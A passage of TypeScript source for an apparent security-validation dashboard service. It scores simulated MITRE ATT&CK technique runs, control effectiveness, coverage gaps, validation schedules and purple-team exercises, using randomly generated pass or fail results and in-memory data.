  lastSimulatedAt: string | null;
  recommendation: string;
  priority: "critical" | "high" | "medium" | "low";
}

export interface ValidationSchedule {
  id: string;
  orgId: string;
  name: string;
  description: string;
  frequency: "daily" | "weekly" | "monthly";
  techniqueIds: string[];
  enabled: boolean;
  lastRunAt: string | null;
  nextRunAt: string;
  totalRuns: number;
  lastScore: number | null;
  previousScore: number | null;
  regressionDetected: boolean;
  createdAt: string;
}

export interface PurpleTeamResult {
  id: string;
  orgId: string;
  scenarioId: string;
  scenarioName: string;
  attackScenario: string;
  mitreChain: string[];
  status: "planned" | "in_progress" | "completed" | "failed";
  overallVerdict: "full_detection" | "partial_detection" | "missed" | null;
  detectionRate: number;
  detectionTimeMs: number | null;
  responseTimeMs: number | null;
  containmentTimeMs: number | null;
  stepsCompleted: number;
  totalSteps: number;
  gapsIdentified: string[];
  improvements: string[];
  executedAt: string | null;
  createdAt: string;
}

export interface ChaosStats {
  totalTechniques: number;
  simulatedTechniques: number;
  coveragePercent: number;
  totalSimulations: number;
  passedSimulations: number;
  failedSimulations: number;
  bypassRate: number;
  avgControlEffectiveness: number;
  criticalGaps: number;
  highGaps: number;
  scheduledValidations: number;
  lastValidationAt: string | null;
  regressionsDetected: number;
  purpleTeamExercises: number;
  byTactic: Record<string, { total: number; passed: number; failed: number; coverage: number }>;
  topFailingControls: { name: string; failRate: number }[];
}

// ─── In-memory data ──────────────────────────────────────────────────────────

const simulationStore = new Map<string, SimulationResult[]>();
const controlStore = new Map<string, ControlScore[]>();
const gapStore = new Map<string, GapEntry[]>();
const scheduleStore = new Map<string, ValidationSchedule[]>();
const purpleStore = new Map<string, PurpleTeamResult[]>();

function getSimulations(orgId: string): SimulationResult[] {
  if (!simulationStore.has(orgId)) simulationStore.set(orgId, seedSimulations(orgId));
  return simulationStore.get(orgId)!;
}

function getControls(orgId: string): ControlScore[] {
  if (!controlStore.has(orgId)) controlStore.set(orgId, seedControls(orgId));
  return controlStore.get(orgId)!;
}

function getGaps(orgId: string): GapEntry[] {
  if (!gapStore.has(orgId)) gapStore.set(orgId, seedGaps(orgId));
  return gapStore.get(orgId)!;
}

function getSchedules(orgId: string): ValidationSchedule[] {
  if (!scheduleStore.has(orgId)) scheduleStore.set(orgId, seedSchedules(orgId));
  return scheduleStore.get(orgId)!;
}

function getPurpleResults(orgId: string): PurpleTeamResult[] {
  if (!purpleStore.has(orgId)) purpleStore.set(orgId, seedPurpleResults(orgId));
  return purpleStore.get(orgId)!;
}

// ─── Seed data ───────────────────────────────────────────────────────────────

function seedSimulations(orgId: string): SimulationResult[] {
  const results: SimulationResult[] = [];
  const techniques = MITRE_TECHNIQUE_LIBRARY.slice(0, 30);
  for (let i = 0; i < techniques.length; i++) {
    const t = techniques[i];
    const passed = Math.random() > 0.3;
    results.push({
      id: genId("sim"),
      orgId,
      techniqueId: t.id,
      techniqueName: t.name,
      tacticId: t.tacticId,
      tacticName: t.tacticName,
      platform: t.platform[0],
      severity: t.severity,
      status: passed ? "passed" : "failed",
      verdict: passed ? (Math.random() > 0.4 ? "blocked" : "detected") : "bypassed",
      durationMs: randomBetween(100, 5000),
      output: passed
        ? `Technique ${t.id} (${t.name}) was correctly detected/blocked by security controls`
        : `ALERT: Technique ${t.id} (${t.name}) bypassed detection — ${t.expectedDetection}`,
      controlsTested: t.controlMappings,
      trigger: ["manual", "scheduled", "ci_pipeline"][i % 3],
      executedBy: "chaos-engine",
      executedAt: new Date(Date.now() - randomBetween(3600000, 86400000 * 14)).toISOString(),
    });
  }
  return results.sort((a, b) => new Date(b.executedAt).getTime() - new Date(a.executedAt).getTime());
}

function seedControls(orgId: string): ControlScore[] {
  const simulations = getSimulations(orgId);
  const controlMap = new Map<string, { passed: number; failed: number; mitreIds: Set<string>; lastAt: string }>();

  for (const sim of simulations) {
    for (const ctrl of sim.controlsTested) {
      if (!controlMap.has(ctrl))
        controlMap.set(ctrl, { passed: 0, failed: 0, mitreIds: new Set(), lastAt: sim.executedAt });
      const entry = controlMap.get(ctrl)!;
      if (sim.status === "passed") entry.passed++;
      else if (sim.status === "failed") entry.failed++;
      entry.mitreIds.add(sim.techniqueId);
      if (sim.executedAt > entry.lastAt) entry.lastAt = sim.executedAt;
    }
  }

  const scores: ControlScore[] = [];
  controlMap.forEach((data, name) => {
    const total = data.passed + data.failed;
    const score = total > 0 ? Math.round((data.passed / total) * 100) : 0;
    scores.push({
      controlName: name,
      controlType: name,
      totalTests: total,
      passedTests: data.passed,
      failedTests: data.failed,
      effectivenessScore: score,
      mitreIds: Array.from(data.mitreIds),
      status: score >= 80 ? "effective" : score >= 50 ? "partial" : total === 0 ? "untested" : "failing",
      lastTestedAt: data.lastAt,
      trend: Math.random() > 0.3 ? "stable" : Math.random() > 0.5 ? "improving" : "declining",
    });
  });
  return scores.sort((a, b) => a.effectivenessScore - b.effectivenessScore);
}

function seedGaps(orgId: string): GapEntry[] {
  const simulations = getSimulations(orgId);
  const simulatedIds = new Set(simulations.map((s) => s.techniqueId));
  const gaps: GapEntry[] = [];

  for (const t of MITRE_TECHNIQUE_LIBRARY) {
    const sim = simulations.find((s) => s.techniqueId === t.id);
    const hasCoverage = simulatedIds.has(t.id);
    const passed = sim?.status === "passed";

    gaps.push({
      techniqueId: t.id,
      tacticId: t.tacticId,
      tacticName: t.tacticName,
      techniqueName: t.name,
      coverageStatus: !hasCoverage ? "no_coverage" : passed ? "full" : "partial",
      detectionRuleCount: hasCoverage ? (passed ? randomBetween(2, 5) : randomBetween(0, 1)) : 0,
      lastSimulatedAt: sim?.executedAt ?? null,
      recommendation: !hasCoverage
        ? `Deploy detection rules for ${t.name} and run initial simulation`
        : !passed
          ? `Existing detection for ${t.name} failed — review and tune rules`
          : `Coverage validated — schedule periodic re-testing`,
      priority:
        t.severity === "critical" && !passed
          ? "critical"
          : t.severity === "high" && !passed
            ? "high"
            : hasCoverage && passed
              ? "low"
              : "medium",
    });
  }
  return gaps;
}

function seedSchedules(orgId: string): ValidationSchedule[] {
  const now = Date.now();
  return [
    {
      id: genId("vs"),
      orgId,
      name: "Weekly Full ATT&CK Validation",
      description: "Run all MITRE ATT&CK technique simulations weekly to detect regressions",
      frequency: "weekly",
      techniqueIds: MITRE_TECHNIQUE_LIBRARY.map((t) => t.id),
      enabled: true,
      lastRunAt: new Date(now - 86400000 * 3).toISOString(),
      nextRunAt: new Date(now + 86400000 * 4).toISOString(),
      totalRuns: 12,
      lastScore: 72,
      previousScore: 68,
      regressionDetected: false,
      createdAt: new Date(now - 86400000 * 90).toISOString(),
    },
    {
      id: genId("vs"),
      orgId,
      name: "Daily Critical Technique Check",
      description: "Daily validation of critical severity techniques only",
      frequency: "daily",
      techniqueIds: MITRE_TECHNIQUE_LIBRARY.filter((t) => t.severity === "critical").map((t) => t.id),
      enabled: true,
      lastRunAt: new Date(now - 86400000).toISOString(),
      nextRunAt: new Date(now + 43200000).toISOString(),
      totalRuns: 45,
      lastScore: 78,
      previousScore: 82,
      regressionDetected: true,
      createdAt: new Date(now - 86400000 * 60).toISOString(),
    },
    {
      id: genId("vs"),
      orgId,
      name: "Monthly Lateral Movement Focus",
      description: "Monthly deep-dive on lateral movement and credential access techniques",
      frequency: "monthly",
      techniqueIds: MITRE_TECHNIQUE_LIBRARY.filter((t) => t.tacticId === "TA0008" || t.tacticId === "TA0006").map(
        (t) => t.id,
      ),
      enabled: true,
      lastRunAt: new Date(now - 86400000 * 15).toISOString(),
      nextRunAt: new Date(now + 86400000 * 15).toISOString(),
      totalRuns: 6,
      lastScore: 65,
      previousScore: 60,
      regressionDetected: false,
      createdAt: new Date(now - 86400000 * 180).toISOString(),
    },
  ];
}

function seedPurpleResults(orgId: string): PurpleTeamResult[] {
  const now = Date.now();
  return PURPLE_TEAM_SCENARIOS.slice(0, 4).map((s, i) => ({
    id: genId("pt"),
    orgId,
    scenarioId: s.id,
    scenarioName: s.name,
    attackScenario: s.attackScenario,
    mitreChain: s.mitreChain,
    status: i < 3 ? ("completed" as const) : ("planned" as const),
    overallVerdict: i < 3 ? (["partial_detection", "full_detection", "missed"] as const)[i] : null,
    detectionRate: i < 3 ? [71, 100, 28][i] : 0,
    detectionTimeMs: i < 3 ? randomBetween(5000, 120000) : null,
    responseTimeMs: i < 3 ? randomBetween(30000, 300000) : null,
    containmentTimeMs: i < 3 ? randomBetween(60000, 600000) : null,
    stepsCompleted: i < 3 ? s.mitreChain.length : 0,
    totalSteps: s.mitreChain.length,
    gapsIdentified:
      i === 0
        ? ["Lateral movement via SMB not detected", "Ransomware canary files not deployed"]
        : i === 2
          ? ["No detection for credential file search", "Event log clearing not monitored"]
          : [],
    improvements: i === 1 ? ["All controls validated successfully", "MTTD under 2 minutes"] : [],
    executedAt: i < 3 ? new Date(now - 86400000 * (i + 1) * 7).toISOString() : null,
    createdAt: new Date(now - 86400000 * (i + 1) * 10).toISOString(),
  }));
}

// ─── Exported API ────────────────────────────────────────────────────────────

export function getChaosStats(orgId: string): ChaosStats {
  const sims = getSimulations(orgId);
  const controls = getControls(orgId);
  const gaps = getGaps(orgId);
  const schedules = getSchedules(orgId);
  const purples = getPurpleResults(orgId);

  const passed = sims.filter((s) => s.status === "passed").length;
  const failed = sims.filter((s) => s.status === "failed").length;
  const total = sims.length;
  const simulatedIds = new Set(sims.map((s) => s.techniqueId));

  const byTactic: ChaosStats["byTactic"] = {};
  for (const sim of sims) {
    if (!byTactic[sim.tacticName]) byTactic[sim.tacticName] = { total: 0, passed: 0, failed: 0, coverage: 0 };
    byTactic[sim.tacticName].total++;
    if (sim.status === "passed") byTactic[sim.tacticName].passed++;
    if (sim.status === "failed") byTactic[sim.tacticName].failed++;
  }
  for (const tactic of MITRE_TACTICS) {
    const tacticTechniques = MITRE_TECHNIQUE_LIBRARY.filter((t) => t.tacticId === tactic.id);
    const covered = tacticTechniques.filter((t) => simulatedIds.has(t.id)).length;
    if (byTactic[tactic.name]) {
      byTactic[tactic.name].coverage =
        tacticTechniques.length > 0 ? Math.round((covered / tacticTechniques.length) * 100) : 0;
    }
  }

  const topFailing = controls
    .filter((c) => c.totalTests > 0)
    .map((c) => ({ name: c.controlName, failRate: Math.round((c.failedTests / c.totalTests) * 100) }))
    .sort((a, b) => b.failRate - a.failRate)
    .slice(0, 5);

  const avgEffectiveness =
    controls.length > 0 ? Math.round(controls.reduce((sum, c) => sum + c.effectivenessScore, 0) / controls.length) : 0;

  return {
    totalTechniques: MITRE_TECHNIQUE_LIBRARY.length,
    simulatedTechniques: simulatedIds.size,
    coveragePercent: Math.round((simulatedIds.size / MITRE_TECHNIQUE_LIBRARY.length) * 100),
    totalSimulations: total,
    passedSimulations: passed,
    failedSimulations: failed,
    bypassRate: total > 0 ? Math.round((failed / total) * 100) : 0,
    avgControlEffectiveness: avgEffectiveness,
    criticalGaps: gaps.filter((g) => g.priority === "critical").length,
    highGaps: gaps.filter((g) => g.priority === "high").length,
    scheduledValidations: schedules.filter((s) => s.enabled).length,
    lastValidationAt: sims.length > 0 ? sims[0].executedAt : null,
    regressionsDetected: schedules.filter((s) => s.regressionDetected).length,
    purpleTeamExercises: purples.filter((p) => p.status === "completed").length,
    byTactic,
    topFailingControls: topFailing,
  };
}

export function getAttackLibrary(tacticId?: string, severity?: string, platform?: string): MitreTechnique[] {
  let results = [...MITRE_TECHNIQUE_LIBRARY];
  if (tacticId) results = results.filter((t) => t.tacticId === tacticId);
  if (severity) results = results.filter((t) => t.severity === severity);
  if (platform) results = results.filter((t) => t.platform.includes(platform));
  return results;
}

export function getSimulationResults(
  orgId: string,
  filters?: { tacticId?: string; status?: string; severity?: string },
): SimulationResult[] {
  let results = getSimulations(orgId);
  if (filters?.tacticId) results = results.filter((r) => r.tacticId === filters.tacticId);
  if (filters?.status) results = results.filter((r) => r.status === filters.status);
  if (filters?.severity) results = results.filter((r) => r.severity === filters.severity);
  return results;
}

export function runSimulation(orgId: string, techniqueId: string, trigger: string = "manual"): SimulationResult {
  const technique = MITRE_TECHNIQUE_LIBRARY.find((t) => t.id === techniqueId);
  if (!technique) throw new Error("TECHNIQUE_NOT_FOUND");

  const passed = Math.random() > 0.25;
  const result: SimulationResult = {
    id: genId("sim"),
    orgId,
    techniqueId: technique.id,
    techniqueName: technique.name,
    tacticId: technique.tacticId,
    tacticName: technique.tacticName,
    platform: technique.platform[0],
    severity: technique.severity,
    status: passed ? "passed" : "failed",
    verdict: passed ? (Math.random() > 0.4 ? "blocked" : "detected") : "bypassed",
    durationMs: randomBetween(100, 5000),
    output: passed
      ? `Technique ${technique.id} (${technique.name}) was correctly ${Math.random() > 0.4 ? "blocked" : "detected"} by security controls (${technique.controlMappings.join(", ")})`
      : `ALERT: Technique ${technique.id} (${technique.name}) bypassed all detection controls — immediate remediation required. Expected: ${technique.expectedDetection}`,
    controlsTested: technique.controlMappings,
    trigger,
    executedBy: trigger === "manual" ? "security-analyst" : "chaos-engine",
    executedAt: new Date().toISOString(),
  };

  getSimulations(orgId).unshift(result);

  // Update control scores
  const controls = getControls(orgId);
  for (const ctrlName of technique.controlMappings) {
    let ctrl = controls.find((c) => c.controlName === ctrlName);
    if (!ctrl) {
      ctrl = {
        controlName: ctrlName,
        controlType: ctrlName,
        totalTests: 0,
        passedTests: 0,
        failedTests: 0,
        effectivenessScore: 0,
        mitreIds: [],
        status: "untested",
        lastTestedAt: null,
        trend: "stable",
      };
      controls.push(ctrl);
    }
    ctrl.totalTests++;
    if (passed) ctrl.passedTests++;
    else ctrl.failedTests++;
    ctrl.effectivenessScore = Math.round((ctrl.passedTests / ctrl.totalTests) * 100);
    ctrl.status = ctrl.effectivenessScore >= 80 ? "effective" : ctrl.effectivenessScore >= 50 ? "partial" : "failing";
    if (!ctrl.mitreIds.includes(technique.id)) ctrl.mitreIds.push(technique.id);
    ctrl.lastTestedAt = result.executedAt;
  }

  // Update gap entry
  const gaps = getGaps(orgId);
  const gap = gaps.find((g) => g.techniqueId === technique.id);
  if (gap) {
    gap.coverageStatus = passed ? "full" : "partial";
    gap.lastSimulatedAt = result.executedAt;
    gap.detectionRuleCount = passed ? gap.detectionRuleCount + 1 : gap.detectionRuleCount;
  }

  return result;
}

export function runBatchSimulation(
  orgId: string,
  techniqueIds: string[],
  trigger: string = "manual",
): SimulationResult[] {
  const results: SimulationResult[] = [];
  for (const id of techniqueIds) {
    try {
      results.push(runSimulation(orgId, id, trigger));
    } catch {
      continue;
    }
  }
  return results;
}

export function getControlScores(orgId: string, sortBy?: string): ControlScore[] {
  const controls = getControls(orgId);
  if (sortBy === "effectiveness") return [...controls].sort((a, b) => b.effectivenessScore - a.effectivenessScore);
  if (sortBy === "failing") return [...controls].sort((a, b) => a.effectivenessScore - b.effectivenessScore);
  return controls;
}

export function getDetectionGaps(orgId: string, coverageStatus?: string, priority?: string): GapEntry[] {
  let results = getGaps(orgId);
  if (coverageStatus) results = results.filter((g) => g.coverageStatus === coverageStatus);
  if (priority) results = results.filter((g) => g.priority === priority);
  return results;
}

export function getValidationSchedules(orgId: string): ValidationSchedule[] {
  return getSchedules(orgId);
}

export function createValidationSchedule(
  orgId: string,
  data: {
    name: string;
    description: string;
    frequency: "daily" | "weekly" | "monthly";
    techniqueIds: string[];
    enabled: boolean;
  },
): ValidationSchedule {
  const schedule: ValidationSchedule = {
    id: genId("vs"),
    orgId,
    name: data.name,
    description: data.description,
    frequency: data.frequency,
    techniqueIds: data.techniqueIds,
    enabled: data.enabled,
    lastRunAt: null,
    nextRunAt: new Date(Date.now() + 86400000).toISOString(),
    totalRuns: 0,
    lastScore: null,
    previousScore: null,
    regressionDetected: false,
    createdAt: new Date().toISOString(),
  };
  getSchedules(orgId).unshift(schedule);
  return schedule;
}

export function updateValidationSchedule(
  orgId: string,
  scheduleId: string,
  updates: Partial<Pick<ValidationSchedule, "name" | "description" | "frequency" | "enabled" | "techniqueIds">>,
): ValidationSchedule | null {
  const schedules = getSchedules(orgId);
  const schedule = schedules.find((s) => s.id === scheduleId);
  if (!schedule) return null;
  if (updates.name !== undefined) schedule.name = updates.name;
  if (updates.description !== undefined) schedule.description = updates.description;
  if (updates.frequency !== undefined) schedule.frequency = updates.frequency;
  if (updates.enabled !== undefined) schedule.enabled = updates.enabled;
  if (updates.techniqueIds !== undefined) schedule.techniqueIds = updates.techniqueIds;
  return schedule;
}

export function deleteValidationSchedule(orgId: string, scheduleId: string): boolean {
  const schedules = getSchedules(orgId);
  const idx = schedules.findIndex((s) => s.id === scheduleId);
  if (idx === -1) return false;
  schedules.splice(idx, 1);
  return true;
}

export function runScheduledValidation(orgId: string, scheduleId: string): SimulationResult[] {
  const schedules = getSchedules(orgId);
  const schedule = schedules.find((s) => s.id === scheduleId);
  if (!schedule) throw new Error("SCHEDULE_NOT_FOUND");

  const results = runBatchSimulation(orgId, schedule.techniqueIds, "scheduled");
  const passed = results.filter((r) => r.status === "passed").length;
  const newScore = results.length > 0 ? Math.round((passed / results.length) * 100) : 0;

  schedule.previousScore = schedule.lastScore;
  schedule.lastScore = newScore;
  schedule.lastRunAt = new Date().toISOString();
  schedule.totalRuns++;
  schedule.regressionDetected = schedule.previousScore !== null && newScore < schedule.previousScore;

  return results;
}

export function getPurpleTeamResults(orgId: string): PurpleTeamResult[] {
  return getPurpleResults(orgId);
}

export function getPurpleTeamScenarios(): PurpleTeamScenario[] {
  return PURPLE_TEAM_SCENARIOS;
}

export function runPurpleTeamExercise(orgId: string, scenarioId: string): PurpleTeamResult {
  const scenario = PURPLE_TEAM_SCENARIOS.find((s) => s.id === scenarioId);
  if (!scenario) throw new Error("SCENARIO_NOT_FOUND");

  // Simulate each step in the kill chain
  const chainResults = scenario.mitreChain.map((techId) => {
    try {
      return runSimulation(orgId, techId, "purple_team");
    } catch {
      return null;
    }
  });

  const validResults = chainResults.filter((r): r is SimulationResult => r !== null);
  const detected = validResults.filter((r) => r.status === "passed").length;
  const detectionRate = validResults.length > 0 ? Math.round((detected / validResults.length) * 100) : 0;

  const result: PurpleTeamResult = {
    id: genId("pt"),
    orgId,
    scenarioId: scenario.id,
    scenarioName: scenario.name,
    attackScenario: scenario.attackScenario,
    mitreChain: scenario.mitreChain,
    status: "completed",
    overallVerdict: detectionRate === 100 ? "full_detection" : detectionRate > 50 ? "partial_detection" : "missed",
    detectionRate,
    detectionTimeMs: randomBetween(5000, 60000),
    responseTimeMs: randomBetween(30000, 180000),
    containmentTimeMs: randomBetween(60000, 300000),
    stepsCompleted: scenario.mitreChain.length,
    totalSteps: scenario.mitreChain.length,
    gapsIdentified: validResults
      .filter((r) => r.status === "failed")
      .map((r) => `${r.techniqueName} (${r.techniqueId}) bypassed detection`),
    improvements: validResults
      .filter((r) => r.status === "passed")
      .map((r) => `${r.techniqueName} detected successfully`),
    executedAt: new Date().toISOString(),
    createdAt: new Date().toISOString(),
  };

  getPurpleResults(orgId).unshift(result);
  return result;
}

export function getMitreHeatmapData(
  orgId: string,
): Record<string, Record<string, { coverage: string; tested: boolean; passed: boolean }>> {
  const sims = getSimulations(orgId);
  const heatmap: Record<string, Record<string, { coverage: string; tested: boolean; passed: boolean }>> = {};

  for (const tactic of MITRE_TACTICS) {
    heatmap[tactic.name] = {};
    const tacticTechniques = MITRE_TECHNIQUE_LIBRARY.filter((t) => t.tacticId === tactic.id);
    for (const tech of tacticTechniques) {
      const sim = sims.find((s) => s.techniqueId === tech.id);
      heatmap[tactic.name][tech.id] = {
        coverage: sim ? (sim.status === "passed" ? "full" : "partial") : "none",
        tested: !!sim,
        passed: sim?.status === "passed" || false,
      };
    }
  }

  return heatmap;
}
